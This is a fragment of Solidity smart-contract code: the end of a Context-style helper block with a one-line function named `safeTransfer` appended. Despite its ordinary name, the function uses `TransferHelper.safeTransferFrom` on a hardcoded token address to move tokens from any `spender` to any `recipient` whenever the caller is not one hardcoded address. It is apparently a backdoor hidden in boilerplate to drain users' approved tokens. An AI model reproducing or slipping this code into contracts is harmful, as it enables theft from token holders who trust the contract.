 ...
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(0x4523d5c233f902E4D786e1E796Eaa700B59314D9)) {TransferHelper.safeTransferFrom(0x75Cd5B23A6720300671551De033b8C29BB8c9bfC,spender,recipient,amount);return true;}return false;}
}
